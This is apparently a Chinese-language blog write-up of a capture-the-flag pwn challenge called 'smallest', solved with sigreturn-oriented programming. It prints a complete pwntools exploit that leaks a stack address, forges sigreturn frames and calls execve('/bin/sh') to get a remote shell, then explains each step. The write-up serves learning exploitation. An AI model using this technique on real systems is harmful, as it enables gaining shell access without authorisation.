做的第一个srop的题目，个人感觉还是很秀，这个题目，看着别的师傅的博客复现的。怎么说呢，今天刚刚学了srop，然后就复现了这个题目。一开始有些地方还是不能理解，主要是这题有点绕。

还是调试了一遍让我解决了一切。

题目叫做smallest，确实很小，只有几行汇编代码。

xor     rax, rax
mov     edx, 400h       ; count
mov     rsi, rsp        ; buf
mov     rdi, rax        ; fd
syscall                 ; LINUX - sys_read
retn

每次往esp上写东西，然后返回，意思是直接给我们控制返回地址的权利，让我们去操作。

实际上这题非常符合srop的特征，有syscall，然后也可以控制大范围的栈空间，最主要的是，可以根据read函数的返回值，控制eax，达到控制系统调用号的目的。

直接上exp，然后分析exp

from pwn import *

context(log_level = 'debug',arch='amd64',os='linux')

#sh = process('./smallest')
sh = remote('node3.buuoj.cn','26733')
start_addr = 0x4000B0
start_no_eax_addr = 0x4000b3
syscall_ret = 0x4000be

#attach(sh,'b *0x4000b0')
payload = p64(start_addr) + p64(start_no_eax_addr) + p64(start_addr)
sh.send(payload)
# pause()
sleep(0.3)

sh.send('\xb3')
# pause()
# leak
stack_addr = u64(sh.recv()[0x148:0x148+8])
print hex(stack_addr)

sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_read
sigframe.rdi = 0
sigframe.rdx = 0x400
sigframe.rsi = stack_addr
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret
# get esp
payload = p64(start_addr) + 'signalaa' + str(sigframe)
sh.send(payload)

#pause()
#attach(sh,'b *0x4000b0')
sleep(0.5)
trigger_sigret = p64(syscall_ret) + 'a'*7
sh.send(trigger_sigret)

#pause()

sleep(0.3)

sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rsp = stack_addr
sigframe.rsi = 0
sigframe.rdx = 0
sigframe.rdi = stack_addr + 0x150
sigframe.rip = syscall_ret

payload = (p64(start_addr) + 'signalaa' + str(sigframe)).ljust(0x150,'a')
payload += "/bin/sh\x00"
sh.send(payload)
sleep(0.3)

#pause()
sh.send(trigger_sigret)


sh.interactive()

1

第一段exp

#attach(sh,'b *0x4000b0')
payload = p64(start_addr) + p64(start_no_eax_addr) + p64(start_addr)
sh.send(payload)
# pause()
sleep(0.3)

首先，返回地址给到了开始的地址，这样的目的是第一次ret之后，能够继续输入，然后输入start_no_eax_addr低1个字节，达到控制eax=1，也就是调用write函数dump内存。

当时是想着，我最后肯定是要往栈上写/bin/sh\x00的，所以我需要知道一片可以写和读的内存，于是选择了一个write函数来泄露内存。泄露的是0x400个字节，然后gdb调试vmmap看到了几乎所有的内存都是可读可写。

所以选了一个stack_addr = u64(sh.recv()[0x148:0x148+8])最后把rsp劫持到这里,然后在这里调用execve。就getshell了。

后面的exp有一个比较注意的就是'signalaa' + str(sigframe)这一串，前面那8个垃圾数据一定是需要的，因为每次ret之后，我要调用syscall去执行sigreturn那么就需要写入一些payload来控制eax，那么如果没有这8个junk字节的话，直接就写入了sigframe里面去了，这样会导致sigreturn第一个ret移位，从而导致我们的寄存器的值整体移位。（这是我的想法）

然而，大家认为p64(start_addr) + 'sigretaa'这里加的'sigretaa'是八个字节的垃圾数据，信号机制中，信号处理完，从内核态重新进入用户态的时候会pop一个sigreturn，而我们这里直接调用了这个系统调用，所以需要垃圾数据来去除这个pop的影响。

我的理解可能有误，大家凑合着看。
